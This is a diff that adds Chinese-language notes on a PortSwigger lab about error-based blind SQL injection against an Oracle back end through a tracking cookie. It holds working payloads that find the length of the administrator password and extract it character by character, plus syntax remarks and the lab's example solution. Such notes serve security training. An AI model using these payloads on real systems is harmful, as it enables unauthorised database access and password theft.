@@ -1,0 +1,21 @@
+### 条件错误盲注 ###
+https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors
+注入点 Cookie: TrackingId=9Rv9bAjy1Vb7pu7c
+
+
+条件语句
+' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a
+
+测试密码字符串长度
+' AND (SELECT CASE WHEN (LENGTH(password) = 20) THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username = 'administrator' AND ROWNUM=1)='a
+
+使用提供的表名与列名与用户名构成输入，使用集群炸弹字符串范围1-20，字符范围小写字符与数字
+@ ROWNUM 为甲骨文数据库的行数限制特性 @
+@ ROWNUM 语句应当使用AND连接在WHERE之后 @
+@ CASE表达式中的分支返回类型应当相同，使用 TO_CHAR将1/0转为字符匹配ELSE的'a' @
+@ SUBSTR 为甲骨文数据库的子字符串特性 @
+' AND (SELECT CASE WHEN (SUBSTR(password, $1$, 1) = '$1$') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username = 'administrator' AND ROWNUM=1)='a
+
+@ 示例解决方案：不是将注入内容构建为整个布尔值，而是作为字符串连接 @
+'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+
